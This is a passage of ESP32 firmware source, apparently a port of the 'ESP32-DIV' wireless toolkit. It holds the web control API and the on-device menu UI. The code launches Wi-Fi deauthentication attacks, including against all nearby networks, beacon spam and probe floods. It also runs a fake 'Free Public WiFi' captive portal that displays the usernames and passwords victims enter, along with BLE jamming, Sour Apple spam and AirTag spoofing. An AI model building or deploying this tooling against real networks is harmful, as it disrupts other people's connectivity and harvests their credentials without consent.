      int start = 0;
      while (start < (int)listStr.length() && customBeaconCount < 10) {
        int pipe = listStr.indexOf('|', start);
        String part = (pipe < 0) ? listStr.substring(start) : listStr.substring(start, pipe);
        part.trim();
        if (part.length() > 0) {
          if (part.length() > 32) part = part.substring(0, 32);
          strncpy(customBeaconSSIDs[customBeaconCount], part.c_str(), 32);
          customBeaconSSIDs[customBeaconCount][32] = 0;
          customBeaconCount++;
        }
        if (pipe < 0) break;
        start = pipe + 1;
      }
      if (customBeaconCount == 0) {
        msg = "Add at least one SSID";
        webServer.send(200, "application/json",
          String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
        return;
      }
    }
    beaconStart();
    msg = "Beacon started";
  }
  else if (action == "beacon_stop") { beaconStop(); msg = "Beacon stopped"; }
  else if (action == "deauth_start") {
    stopAllTools();
    if (target < 0) deauthStartAll();
    else deauthStart(target);
    msg = "Deauth started";
  }
  else if (action == "deauth_stop") { deauthStop(); msg = "Deauth stopped"; }
  else if (action == "det_start") { stopAllTools(); detStart(); msg = "Detector started"; }
  else if (action == "det_stop") { detStop(); msg = "Detector stopped"; }
  else if (action == "probe_start") { stopAllTools(); probeStart(); msg = "Probe started"; }
  else if (action == "probe_stop") { probeStop(); msg = "Probe stopped"; }
  else if (action == "ble_scan") {
    sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
    bleScanStart();
    msg = "BLE scan started (4s)";
  }
  else if (action == "sniff_start") { spoofStop(); sourStop(); jamStop(); airTagStop(); sniffStart(); msg = "Sniff started"; }
  else if (action == "sniff_stop") { sniffStop(); msg = "Sniff stopped"; }
  else if (action == "spoof_start") {
    sniffStop(); sourStop(); jamStop(); airTagStop();
    spoofMode = (uint8_t)mode;
    if (customName.length()) spoofCustomName = customName;
    spoofStart();
    msg = "Spoofer started";
  }
  else if (action == "spoof_stop") { spoofStop(); msg = "Spoofer stopped"; }
  else if (action == "sour_start") {
    sniffStop(); spoofStop(); jamStop(); airTagStop();
    sourSelected = idx;  // -1 = random
    sourStart();
    sourBeginAdvertise();
    msg = "Sour Apple started";
  }
  else if (action == "sour_stop") { sourStop(); msg = "Sour Apple stopped"; }
  else if (action == "jam_start") { sniffStop(); spoofStop(); sourStop(); airTagStop(); jamStart(); msg = "Jammer started"; }
  else if (action == "jam_stop") { jamStop(); msg = "Jammer stopped"; }
  else if (action == "air_start") { sniffStop(); spoofStop(); sourStop(); jamStop(); airTagBeginSpoof(); msg = "AirTag spoof started"; }
  else if (action == "air_stop") { airTagStop(); msg = "AirTag stopped"; }
  else msg = "Unknown action";

  webServer.send(200, "application/json",
    String("{\"msg\":\"") + msg + "\",\"status\":" + jsonStatus() + "}");
}


static void drawWebModeScreen() {
  tft.fillScreen(COL_BG);
  Theme::drawStatusBar("WEB MODE");
  Theme::printCentered("Soft-AP active", 28, COL_OK, 1);
  Theme::printCentered("SSID: ESP32-1", 48, COL_FG, 1);
  Theme::printCentered("Pass: rgisking", 64, COL_FG, 1);
  Theme::printCentered("http://192.168.4.1", 84, COL_ACCENT, 1);
  Theme::drawFooter("LED ON", "Hold BOOT=Exit");
}

static void setupWebRoutes() {
  webServer.stop();
  webServer.on("/", HTTP_GET, handleWebRoot);
  webServer.on("/api/status", HTTP_GET, handleWebStatus);
  webServer.on("/api", HTTP_POST, handleWebApi);
  webServer.onNotFound(handleWebRoot);
  webServer.begin();
}

static void enterWebMode() {
  if (webMode) return;
  stopAllTools();
  webMode = true;
  webExitRequested = false;
  digitalWrite(STATUS_LED, HIGH);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-1", "rgisking");
  delay(150);
  setupWebRoutes();
  drawWebModeScreen();
  Serial.println("[WEB] Soft-AP ESP32-1 / rgisking -> http://192.168.4.1");
}

static void exitWebMode() {
  if (!webMode) return;
  stopAllTools();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  digitalWrite(STATUS_LED, LOW);
  webMode = false;
  webExitRequested = false;
  bootHoldStart = 0;
  bootWasDown = false;
  Serial.println("[WEB] Exited Soft-AP mode");
}

static void handleWebClients() {
  if (!webMode) return;
  webServer.handleClient();
  if (webExitRequested) exitWebMode();
}


// ============================================================
//  UI
// ============================================================


UI ui;

const char* const UI::MAIN_ITEMS[] = { "Wi-Fi Tools", "Bluetooth Tools", "About" };
const int UI::MAIN_COUNT = 3;

const char* const UI::WIFI_ITEMS[] = {
  "Wi-Fi Scanner", "Packet Monitor", "Beacon Spammer",
  "Deauth Attack", "Deauth Detector", "Probe Flood", "Captive Portal", "Back"
};
const int UI::WIFI_COUNT = 8;

const char* const UI::BLE_ITEMS[] = {
  "BLE Scanner", "BLE Sniffer", "BLE Spoofer", "Sour Apple",
  "BLE Jammer", "AirTag Tools", "Back"
};
const int UI::BLE_COUNT = 7;

void UI::begin() {
  pinMode(BOOT_BTN, INPUT_PULLUP);
  pinMode(STATUS_LED, OUTPUT);
  digitalWrite(STATUS_LED, LOW);

  Theme::init();
  joystick.begin();
  wifiScanBegin();
  _screen = SCR_MAIN;
  _sel = 0; _top = 0; _dirty = true;
  drawCurrent();
}

void UI::enterScreen(Screen s) {
  pmStop(); beaconStop(); detStop(); deauthStop(); probeStop(); captiveStop();
  sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();

  _screen = s;
  _sel = 0; _top = 0; _dirty = true;

  if (s == SCR_WIFI_SCAN)  wifiScanStart();
  if (s == SCR_BLE_SCAN)   bleScanStart();
  if (s == SCR_PACKET_MON) pmStart();
  if (s == SCR_BEACON)     { beaconStop(); }
  if (s == SCR_DEAUTH_DET) detStart();
  if (s == SCR_PROBE)      { probeStop(); }
  if (s == SCR_CAPTIVE)    captiveStart();
  if (s == SCR_BLE_SNIFF)  sniffStart();
  if (s == SCR_BLE_SPOOF)  { spoofStop(); }
  if (s == SCR_SOUR_APPLE) {
    sourStart();
    _sel = (sourSelected < 0) ? 0 : (sourSelected + 1);
    if (_sel >= 6) _top = _sel - 5;
  }
  if (s == SCR_BLE_JAM)    { jamStop(); }
  if (s == SCR_AIRTAG)     airTagStart();  // mode 0 = menu
}

void UI::goBack() {
  pmStop(); beaconStop(); detStop(); deauthStop(); probeStop(); captiveStop();
  sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();

  switch (_screen) {
    case SCR_WIFI_MENU: case SCR_BLE_MENU: case SCR_ABOUT:
      enterScreen(SCR_MAIN); break;
    case SCR_WIFI_SCAN: case SCR_PACKET_MON: case SCR_BEACON:
    case SCR_DEAUTH: case SCR_DEAUTH_DET: case SCR_PROBE: case SCR_CAPTIVE:
      enterScreen(SCR_WIFI_MENU); break;
    case SCR_BLE_SCAN: case SCR_BLE_SNIFF: case SCR_BLE_SPOOF:
    case SCR_SOUR_APPLE: case SCR_BLE_JAM: case SCR_AIRTAG:
      enterScreen(SCR_BLE_MENU); break;
    default:
      enterScreen(SCR_MAIN); break;
  }
}

void UI::handleInput(JoyAction a) {
  if (a == JOY_NONE) return;

  // WiFi Scanner
  if (_screen == SCR_WIFI_SCAN) {
    int cnt = wifiScanning ? 0 : wifiCount;
    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; if (_top > _sel) _top = _sel; }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (cnt > 0 && _sel < cnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (!wifiScanning) { wifiScanStart(); _sel = 0; _top = 0; _dirty = true; }
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // BLE Scanner
  if (_screen == SCR_BLE_SCAN) {
    int cnt = bleScanning ? 0 : bleCount;
    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; if (_top > _sel) _top = _sel; }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (cnt > 0 && _sel < cnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (!bleScanning) { bleScanStart(); _sel = 0; _top = 0; _dirty = true; }
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // Deauth Attack – index 0 = ALL, 1..N = single AP
  if (_screen == SCR_DEAUTH) {
    if (deauthRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { deauthStop(); _dirty = true; }
      return;
    }
    int cnt = wifiCount;
    if (cnt == 0) {
      if (a == JOY_BACK || a == JOY_SELECT) goBack();
      return;
    }
    int menuCnt = cnt + 1;
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < menuCnt-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (_sel == 0) deauthStartAll();
      else deauthStart(_sel - 1);
      _dirty = true;
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // Live tools
  if (_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
      _screen == SCR_DEAUTH_DET || _screen == SCR_PROBE || _screen == SCR_CAPTIVE) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (_screen == SCR_PACKET_MON) { pmStop(); delay(20); pmStart(); _dirty = true; }
      else if (_screen == SCR_BEACON) {
        if (beaconRunning) beaconStop();
        else if (beaconMode == 1 && wifiCount == 0) { /* need scan */ }
        else beaconStart();
        _dirty = true;
      } else if (_screen == SCR_DEAUTH_DET) {
        deauthCount = 0; detMacSeen = false; _dirty = true;
      } else if (_screen == SCR_PROBE) {
        if (probeRunning) probeStop(); else probeStart();
        _dirty = true;
      }
    } else if (_screen == SCR_BEACON && !beaconRunning &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      beaconMode = beaconMode ? 0 : 1;
      _dirty = true;
    } else if (_screen == SCR_DEAUTH_DET &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      detMainOnly = !detMainOnly;
      detCh = 1;
      esp_wifi_set_channel(detCh, WIFI_SECOND_CHAN_NONE);
      _dirty = true;
    }
    return;
  }

  // BLE Sniffer / Spoofer
  if (_screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (_screen == SCR_BLE_SNIFF) {
        sniffStop(); delay(20); sniffStart(); _dirty = true;
      } else if (_screen == SCR_BLE_SPOOF) {
        if (spoofRunning) spoofStop();
        else if (spoofMode == 1 && bleCount == 0) { /* need BLE scan */ }
        else spoofStart();
        _dirty = true;
      }
    } else if (_screen == SCR_BLE_SPOOF && !spoofRunning &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      spoofMode = spoofMode ? 0 : 1;
      _dirty = true;
    }
    return;
  }

  // Sour Apple – list selector + run (item 0 = Random Mix)
  if (_screen == SCR_SOUR_APPLE) {
    const int sourMenuCount = APPLE_LIST_COUNT + 1;  // + Random Mix
    if (sourRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { sourStop(); _dirty = true; }
      return;
    }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < sourMenuCount-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      sourSelected = (_sel == 0) ? -1 : (_sel - 1);  // -1 = random mix
      sourBeginAdvertise();
      _dirty = true;
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // BLE Jammer
  if (_screen == SCR_BLE_JAM) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (jamRunning) jamStop(); else jamStart();
      _dirty = true;
    }
    return;
  }

  // AirTag Tools
  if (_screen == SCR_AIRTAG) {
    if (airTagRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { airTagStop(); airTagMode = 0; _dirty = true; }
      return;
    }
    // simple two-option menu: Spoof / Back handled by long press
    if (a == JOY_SELECT) {
      airTagBeginSpoof();
      _dirty = true;
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // Menus
  int count = 0;
  switch (_screen) {
    case SCR_MAIN: count = MAIN_COUNT; break;
    case SCR_WIFI_MENU: count = WIFI_COUNT; break;
    case SCR_BLE_MENU: count = BLE_COUNT; break;
    default: count = 1; break;
  }

  if (a == JOY_UP || a == JOY_HOLD_UP) {
    if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
  } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
    if (_sel < count-1) { _sel++; if (_sel >= _top+6) _top = _sel-5; _dirty = true; }
  } else if (a == JOY_SELECT) {
    if (_screen == SCR_MAIN) {
      if (_sel == 0) enterScreen(SCR_WIFI_MENU);
      else if (_sel == 1) enterScreen(SCR_BLE_MENU);
      else if (_sel == 2) enterScreen(SCR_ABOUT);
    } else if (_screen == SCR_WIFI_MENU) {
      if (_sel == 0) enterScreen(SCR_WIFI_SCAN);
      else if (_sel == 1) enterScreen(SCR_PACKET_MON);
      else if (_sel == 2) enterScreen(SCR_BEACON);
      else if (_sel == 3) enterScreen(SCR_DEAUTH);
      else if (_sel == 4) enterScreen(SCR_DEAUTH_DET);
      else if (_sel == 5) enterScreen(SCR_PROBE);
      else if (_sel == 6) enterScreen(SCR_CAPTIVE);
      else if (_sel == 7) goBack();
    } else if (_screen == SCR_BLE_MENU) {
      if (_sel == 0) enterScreen(SCR_BLE_SCAN);
      else if (_sel == 1) enterScreen(SCR_BLE_SNIFF);
      else if (_sel == 2) enterScreen(SCR_BLE_SPOOF);
      else if (_sel == 3) enterScreen(SCR_SOUR_APPLE);
      else if (_sel == 4) enterScreen(SCR_BLE_JAM);
      else if (_sel == 5) enterScreen(SCR_AIRTAG);
      else if (_sel == 6) goBack();
    } else if (_screen == SCR_ABOUT) goBack();
  } else if (a == JOY_BACK) goBack();
}

static void drawStubScreen(const char* title, const char* line1, const char* line2 = nullptr) {
  Theme::drawStatusBar(title);
  Theme::printCentered(line1, 48, COL_WARN, 1);
  if (line2) Theme::printCentered(line2, 64, COL_DIM, 1);
  Theme::drawFooter(nullptr, "Btn = Back");
}

void UI::drawWifiScanScreen() {
  Theme::drawStatusBar("Wi-Fi Scan");
  if (wifiScanning) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::printCentered("Please wait", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
    return;
  }
  static const char* ssids[WIFI_MAX_NETS];
  static int32_t rssis[WIFI_MAX_NETS];
  for (int i = 0; i < wifiCount; i++) {
    ssids[i] = wifiNets[i].ssid.c_str();
    rssis[i] = wifiNets[i].rssi;
  }
  Theme::drawWifiList(ssids, rssis, wifiCount, _sel, _top);
  char left[20];
  snprintf(left, sizeof(left), "%d nets", wifiCount);
  Theme::drawFooter(left, "Sel=Refresh");
}

void UI::drawBleScanScreen() {
  Theme::drawStatusBar("BLE Scan");
  if (bleScanning) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::printCentered("4 seconds", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
    return;
  }
  static const char* names[BLE_MAX_DEVS];
  static int32_t rssis[BLE_MAX_DEVS];
  for (int i = 0; i < bleCount; i++) {
    names[i] = bleDevs[i].name.c_str();
    rssis[i] = bleDevs[i].rssi;
  }
  Theme::drawWifiList(names, rssis, bleCount, 0, 0);  // no interactive sel for continuous sniff
  char left[20];
  snprintf(left, sizeof(left), "%d devs", bleCount);
  Theme::drawFooter(left, "Sel=Refresh");
}

static void drawPacketMonitor() {
  Theme::drawStatusBar("Packet Mon");
  const int baseY = 100, maxH = 70, barW = 8, gap = 2, startX = 6;
  uint16_t mx = 1;
  for (int i = 0; i < 14; i++) if (pktCount[i] > mx) mx = pktCount[i];
  for (int i = 0; i < 14; i++) {
    int h = (pktCount[i] * maxH) / mx;
    if (h < 1 && pktCount[i] > 0) h = 1;
    int x = startX + i * (barW + gap);
    tft.fillRect(x, baseY - maxH, barW, maxH, 0x1082);
    uint16_t col = (i + 1 == pmChannel) ? COL_ACCENT : COL_OK;
    if (h > 0) tft.fillRect(x, baseY - h, barW, h, col);
    if (i == 0 || i == 5 || i == 10 || i == 13) {
      tft.setTextColor(COL_DIM, COL_BG);
      tft.setCursor(x, baseY + 2);
      tft.print(i + 1);
    }
  }
  char buf[28];
  snprintf(buf, sizeof(buf), "Ch%d  %lu pkts", pmChannel, (unsigned long)pktTotal);
  Theme::drawFooter(buf, "Sel=Reset");
}

static void drawBeaconScreen() {
  Theme::drawStatusBar("Beacon Spam");
  if (beaconRunning) {
    Theme::printCentered("RUNNING", 32, COL_OK, 1);
    char buf[32];
    if (beaconMode == 1 && wifiCount > 0)
      snprintf(buf, sizeof(buf), "%.16s", wifiNets[beaconCloneIdx].ssid.c_str());
    else
      snprintf(buf, sizeof(buf), "%.16s", beaconSSIDs[beaconIdx]);
    Theme::printCentered(buf, 48, COL_FG, 1);
    snprintf(buf, sizeof(buf), "CH%d %lu", beaconCh, (unsigned long)beaconSent);
    Theme::printCentered(buf, 64, COL_DIM, 1);
    Theme::printCentered(beaconMode ? "CLONE" : "LIST", 80, COL_ACCENT, 1);
  } else {
    Theme::printCentered(beaconMode ? "Mode: CLONE" : "Mode: LIST", 40, COL_TITLE, 1);
    if (beaconMode && wifiCount == 0)
      Theme::printCentered("Scan WiFi first!", 58, COL_WARN, 1);
    else
      Theme::printCentered("Sel=Start  L/R=Mode", 58, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawDeauthDetScreen() {
  Theme::drawStatusBar("Deauth Detect");
  char buf[28];
  snprintf(buf, sizeof(buf), "%lu  CH%d %s",
           (unsigned long)deauthCount, detCh, detMainOnly ? "M" : "A");
  Theme::printCentered(buf, 28, COL_FG, 1);
  if (detMacSeen) {
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             detLastMac[0], detLastMac[1], detLastMac[2],
             detLastMac[3], detLastMac[4], detLastMac[5]);
    Theme::printCentered(buf, 46, COL_ACCENT, 1);
    snprintf(buf, sizeof(buf), "CH%d  %d dBm", detLastCh, (int)detLastRssi);
    Theme::printCentered(buf, 62, COL_DIM, 1);
  } else {
    Theme::printCentered("Waiting...", 50, COL_DIM, 1);
  }
  Theme::drawFooter("L/R=Mode", "Sel=Reset");
}

static void drawDeauthScreen(int sel, int top) {
  Theme::drawStatusBar("Deauth Attack");
  if (deauthRunning) {
    Theme::printCentered("ATTACKING", 36, COL_ERR, 1);
    if (deauthTarget == -2) {
      Theme::printCentered("ALL NETWORKS", 54, COL_FG, 1);
    } else if (deauthTarget >= 0 && deauthTarget < wifiCount) {
      char s[18];
      const char* src = wifiNets[deauthTarget].ssid.c_str();
      int n = 0; while (src[n] && n < 15) { s[n] = src[n]; n++; }
      if (src[n]) s[n++] = '.'; s[n] = 0;
      Theme::printCentered(s, 54, COL_FG, 1);
    }
    char buf[24];
    snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)deauthSent);
    Theme::printCentered(buf, 72, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (wifiCount == 0) {
    Theme::printCentered("No scan data", 50, COL_WARN, 1);
    Theme::printCentered("Scan first", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
  } else {
    static const char* items[WIFI_MAX_NETS + 1];
    items[0] = ">> ALL NETWORKS <<";
    for (int i = 0; i < wifiCount; i++) items[i + 1] = wifiNets[i].ssid.c_str();
    Theme::drawMenuList(items, wifiCount + 1, sel, top, 18, 14);
    Theme::drawFooter("Pick target", "Sel=Start");
  }
}

static void drawProbeScreen() {
  Theme::drawStatusBar("Probe Flood");
  if (probeRunning) {
    Theme::printCentered("FLOODING", 40, COL_OK, 1);
    char buf[24];
    snprintf(buf, sizeof(buf), "%lu probes", (unsigned long)probeSent);
    Theme::printCentered(buf, 58, COL_FG, 1);
    snprintf(buf, sizeof(buf), "CH %d", probeCh);
    Theme::printCentered(buf, 74, COL_DIM, 1);
  } else {
    Theme::printCentered("STOPPED", 50, COL_WARN, 1);
    Theme::printCentered("Sel = Start", 70, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawCaptiveScreen() {
  Theme::drawStatusBar("Captive Portal");
  Theme::printCentered("Free Public WiFi", 28, COL_TITLE, 1);
  char buf[28];
  snprintf(buf, sizeof(buf), "Clients:%lu Hits:%lu",
           (unsigned long)captiveClients, (unsigned long)captiveHits);
  Theme::printCentered(buf, 46, COL_FG, 1);
  if (captiveLastUser[0]) {
    Theme::printCentered(captiveLastUser, 64, COL_ACCENT, 1);
    Theme::printCentered(captiveLastPass[0] ? captiveLastPass : "(pass)", 80, COL_DIM, 1);
  } else {
    Theme::printCentered("Waiting for login...", 68, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}


static void drawBleSniffScreen() {
  Theme::drawStatusBar("BLE Sniffer");
  if (bleScanning && bleCount == 0) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::drawFooter(nullptr, "L-Back");
    return;
  }
  static const char* names[BLE_MAX_DEVS];
  static int32_t rssis[BLE_MAX_DEVS];
  for (int i = 0; i < bleCount; i++) {
    names[i] = bleDevs[i].name.c_str();
    rssis[i] = bleDevs[i].rssi;
  }
  Theme::drawWifiList(names, rssis, bleCount, 0, 0);  // no interactive sel for continuous sniff
  char left[20];
  snprintf(left, sizeof(left), "%d devs", bleCount);
  Theme::drawFooter(left, "Sel=Refresh");
}

static void drawBleSpoofScreen() {
  Theme::drawStatusBar("BLE Spoofer");
  if (spoofRunning) {
    Theme::printCentered("ADVERTISING", 36, COL_OK, 1);
    Theme::printCentered(spoofMode ? "CLONE SCAN" : "NAME LIST", 52, COL_FG, 1);
    Theme::printCentered("rotating...", 68, COL_DIM, 1);
  } else {
    Theme::printCentered(spoofMode ? "Mode: CLONE" : "Mode: LIST", 40, COL_TITLE, 1);
    if (spoofMode && bleCount == 0)
      Theme::printCentered("BLE Scan first!", 58, COL_WARN, 1);
    else
      Theme::printCentered("Sel=Start  L/R=Mode", 58, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawSourAppleList(int sel, int top) {
  Theme::drawStatusBar("Sour Apple");
  if (sourRunning) {
    Theme::printCentered("SPAMMING", 36, COL_OK, 1);
    const char* nm = (sourSelected < 0) ? "Random Mix" : appleList[sourSelected].name;
    Theme::printCentered(nm, 52, COL_FG, 1);
    char buf[28];
    snprintf(buf, sizeof(buf), "%lu pkts", (unsigned long)sourSent);
    Theme::printCentered(buf, 68, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
    return;
  }
  static const char* names[40];
  names[0] = "Random Mix";
  for (int i = 0; i < APPLE_LIST_COUNT && i < 39; i++) names[i+1] = appleList[i].name;
  Theme::drawMenuList(names, APPLE_LIST_COUNT + 1, sel, top, 18, 14);
  Theme::drawFooter("Pick type", "Sel=Start");
}

static void drawJamScreen() {
  Theme::drawStatusBar("BLE Jammer");
  if (jamRunning) {
    Theme::printCentered("FLOODING", 40, COL_ERR, 1);
    char buf[24];
    snprintf(buf, sizeof(buf), "%lu advs", (unsigned long)jamCount);
    Theme::printCentered(buf, 60, COL_FG, 1);
  } else {
    Theme::printCentered("STOPPED", 50, COL_WARN, 1);
    Theme::printCentered("Sel = Start", 70, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawAirTagScreen() {
  Theme::drawStatusBar("AirTag Tools");
  if (airTagRunning && airTagMode == 1) {
    Theme::printCentered("SPOOFING", 40, COL_OK, 1);
    Theme::printCentered("Find My style", 58, COL_FG, 1);
    char buf[24];
    snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)airTagSent);
    Theme::printCentered(buf, 74, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else {
    Theme::printCentered("AirTag Spoofer", 44, COL_TITLE, 1);
    Theme::printCentered("Sel = Start", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
  }
}

void UI::drawCurrent() {

  Theme::clear();
  switch (_screen) {
    case SCR_MAIN:
      Theme::drawStatusBar("ESP32-DIV", false);
      Theme::drawMenuList(MAIN_ITEMS, MAIN_COUNT, _sel, _top);
      Theme::drawFooter("Joy: Nav", "Btn: Select");
      break;
    case SCR_WIFI_MENU:
      Theme::drawStatusBar("Wi-Fi Tools");
      Theme::drawMenuList(WIFI_ITEMS, WIFI_COUNT, _sel, _top);
      Theme::drawFooter("Up/Dn", "Sel / L-Back");
      break;
    case SCR_BLE_MENU:
      Theme::drawStatusBar("Bluetooth");
      Theme::drawMenuList(BLE_ITEMS, BLE_COUNT, _sel, _top);
      Theme::drawFooter("Up/Dn", "Sel / L-Back");
      break;
    case SCR_WIFI_SCAN:   drawWifiScanScreen(); break;
    case SCR_BLE_SCAN:    drawBleScanScreen(); break;
    case SCR_PACKET_MON:  drawPacketMonitor(); break;
    case SCR_BEACON:      drawBeaconScreen(); break;
    case SCR_DEAUTH_DET:  drawDeauthDetScreen(); break;
    case SCR_DEAUTH:      drawDeauthScreen(_sel, _top); break;
    case SCR_PROBE:       drawProbeScreen(); break;
    case SCR_CAPTIVE:     drawCaptiveScreen(); break;
    case SCR_BLE_SNIFF:   drawBleSniffScreen(); break;
    case SCR_BLE_SPOOF:   drawBleSpoofScreen(); break;
    case SCR_SOUR_APPLE:  drawSourAppleList(_sel, _top); break;
    case SCR_BLE_JAM:     drawJamScreen(); break;
    case SCR_AIRTAG:      drawAirTagScreen(); break;
    case SCR_ABOUT:
      Theme::drawStatusBar("About");
      Theme::printCentered("ESP32-DIV Port", 36, COL_TITLE, 1);
      Theme::printCentered("ST7735 160x128", 52, COL_FG, 1);
      Theme::printCentered("WiFi + BLE", 68, COL_DIM, 1);
      Theme::printCentered("Joystick UI", 84, COL_DIM, 1);
      Theme::drawFooter(nullptr, "Btn = Back");
      break;
    default:
      drawStubScreen("Unknown", "Go back");
      break;
  }
  _dirty = false;
}

void UI::loop() {
  // ---- BOOT button (GPIO0) hold 2s toggles Soft-AP web mode ----
  bool bootDown = (digitalRead(BOOT_BTN) == LOW);
  if (bootDown) {
    if (!bootWasDown) {
      bootWasDown = true;
      bootHoldStart = millis();
    } else if (bootHoldStart && (millis() - bootHoldStart >= 2000)) {
      bootHoldStart = 0;  // fire once per hold
      if (webMode) {
        exitWebMode();
        _screen = SCR_MAIN;
        _sel = 0; _top = 0; _dirty = true;
        drawCurrent();
      } else {
        enterWebMode();
      }
    }
  } else {
    bootWasDown = false;
    bootHoldStart = 0;
  }

  if (webMode) {
    // Keep tool updates alive so web-started tools work
    wifiScanUpdate();
    bleScanUpdate();
    pmUpdate();
    beaconUpdate();
    detUpdate();
    deauthUpdate();
    probeUpdate();
    sniffUpdate();
    spoofUpdate();
    sourUpdate();
    jamUpdate();
    airTagUpdate();
    handleWebClients();
    // If exit was requested from web UI
    if (!webMode) {
      _screen = SCR_MAIN;
      _sel = 0; _top = 0; _dirty = true;
      drawCurrent();
    }
    return;  // skip joystick UI while web mode is active
  }

  joystick.update();
  wifiScanUpdate();
  bleScanUpdate();
  pmUpdate();
  beaconUpdate();
  detUpdate();
  deauthUpdate();
  probeUpdate();
  captiveUpdate();
  sniffUpdate();
  spoofUpdate();
  sourUpdate();
  jamUpdate();
  airTagUpdate();

  static bool wasWifi = false, wasBle = false;
  if (wasWifi && !wifiScanning && _screen == SCR_WIFI_SCAN) _dirty = true;
  if (wasBle  && !bleScanning  && _screen == SCR_BLE_SCAN)  _dirty = true;
  wasWifi = wifiScanning;
  wasBle  = bleScanning;

  static uint32_t lastLive = 0;
  if ((_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
       _screen == SCR_DEAUTH_DET || _screen == SCR_DEAUTH ||
       _screen == SCR_PROBE || _screen == SCR_CAPTIVE ||
       _screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF ||
       _screen == SCR_SOUR_APPLE || _screen == SCR_BLE_JAM ||
       _screen == SCR_AIRTAG) &&
      (millis() - lastLive > 250)) {
    lastLive = millis();
    _dirty = true;
  }

  JoyAction a = joystick.getAction();
  if (a != JOY_NONE) handleInput(a);
  if (_dirty) drawCurrent();
}
